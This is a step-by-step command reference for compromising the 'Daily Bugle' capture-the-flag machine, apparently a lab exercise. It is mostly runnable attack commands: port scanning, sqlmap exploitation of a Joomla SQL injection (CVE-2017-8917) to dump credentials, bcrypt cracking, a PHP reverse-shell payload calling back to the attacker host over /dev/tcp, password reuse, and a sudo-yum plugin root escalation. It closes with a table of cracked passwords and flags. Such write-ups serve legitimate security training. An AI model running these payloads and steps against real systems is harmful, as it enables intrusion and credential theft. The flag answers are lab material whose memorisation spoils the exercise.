# Command Reference — Daily Bugle

Every relevant command used in the engagement, in order, cleaned up and reproducible. Replace the variables with live values.

```bash
IP=10.128.140.121        # target
LHOST=10.128.115.26      # attacker (AttackBox) — CHANGES on every redeploy, verify with: hostname -I
LPORT=4444               # listener port
```

> **Tip:** after any machine redeploy, re-check `hostname -I` and update `LHOST` — a stale attacker IP in the reverse-shell payload is the #1 cause of "the shell never connects."

---

## Phase 1 — Reconnaissance & enumeration

```bash
# Confirm the host is alive (note the TTL: 64 = Linux)
ping -c 3 $IP

# Full TCP port scan — all 65,535 ports, fast
nmap -p1-65535 --min-rate 10000 -T4 $IP -oN allports.txt

# Deep scan: service versions + default scripts on the open ports
nmap -p22,80,3306 -sC -sV -oN services.txt $IP
```

### Web / Joomla fingerprinting

```bash
# Pin the exact Joomla version (decides the exploit)
curl -s http://$IP/administrator/manifests/files/joomla.xml      # look for <version>3.7.0</version>
curl -s http://$IP/language/en-GB/en-GB.xml | grep -i version    # fallback

# (Optional) automated Joomla scanner
joomscan --url http://$IP

# Identify the active template folder name (used later to trigger the shell)
curl -s http://$IP/ | grep -oE 'templates/[a-zA-Z0-9_-]+/' | sort -u
```

---

## Phase 2–3 — SQL injection & credential extraction (CVE-2017-8917)

```bash
# 1. Confirm injection + list databases
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -p "list[fullordering]" --risk=3 --level=5 --random-agent --batch --dbs

# 2. List tables in the 'joomla' database
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -p "list[fullordering]" --risk=3 --level=5 --random-agent --batch -D joomla --tables

# 3. Dump the admin credentials from #__users
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -p "list[fullordering]" --risk=3 --level=5 --random-agent --batch \
  -D joomla -T '#__users' -C name,username,password,email --dump
# → jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

### Crack the bcrypt hash (John the Ripper)

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt

# Full wordlist is slow against bcrypt — build a CONTEXT-based wordlist instead
grep -i spider /usr/share/wordlists/rockyou.txt > spider.txt

# John isn't always on PATH — call it directly if 'john: command not found'
/usr/sbin/john --wordlist=spider.txt hash.txt       # → spiderman123  (cracked <1s)
/usr/sbin/john --show hash.txt                       # re-display cracked result
```

---

## Phase 3 — Foothold: authenticated RCE via template editor

**In the browser:** log in at `http://$IP/administrator` as `jonah:spiderman123` →
**Extensions → Templates → Templates → Protostar → edit `index.php`** → replace all with the payload below → **Save**.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
```
> Substitute the real `LHOST`/`LPORT` (e.g. `/dev/tcp/10.128.115.26/4444`).

```bash
# Terminal 1 — start the listener FIRST, leave it running
nc -lvnp 4444

# (Optional) verify the payload is actually saved — should HANG ~3s, not return instantly
curl -s http://$IP/templates/protostar/index.php -m 3 ; echo "[returned]"

# Terminal 2 — trigger the shell (will hang = success; check Terminal 1)
curl http://$IP/templates/protostar/index.php
```

---

## Phase 4 — Privilege escalation

### 4.0 Stabilize the shell (run in the caught shell)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
id ; hostname
```

### 4.1 apache → jjameson (plaintext DB password reuse)

```bash
# Joomla stores the DB password in plaintext
cat /var/www/html/configuration.php | grep -i -E 'user|password|db'
# → public $password = 'nv5uz9r3ZEDzVjNu';

# Find real system users (login shells)
cat /etc/passwd | grep -E 'sh$'      # → jjameson

# Password reuse: the DB password is jjameson's login password
su jjameson                          # password: nv5uz9r3ZEDzVjNu

cat /home/jjameson/user.txt          # USER FLAG
```

### 4.2 jjameson → root (sudo yum — GTFOBins)

```bash
# Confirm the misconfiguration
sudo -l                              # → (ALL) NOPASSWD: /usr/bin/yum

# Build & load a malicious yum plugin to spawn a root shell
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y   # → root shell (sh-4.2#)

id                                   # → uid=0(root)
cat /root/root.txt                   # ROOT FLAG
```

---

## Phase 5 — Cleanup

```bash
rm -rf $TF                           # remove the temp yum-plugin dir
# In the Joomla editor: clear the reverse shell out of protostar/index.php
```

---

## Captured objectives

| Objective | Value |
|-----------|-------|
| Joomla admin | `jonah : spiderman123` |
| DB password | `nv5uz9r3ZEDzVjNu` |
| System user | `jjameson : nv5uz9r3ZEDzVjNu` |
| User flag | `27a260fe3cba712cfdedb1c86d80442e` |
| Root flag | `eec3d53292b1821868266858d7fa6f79` |
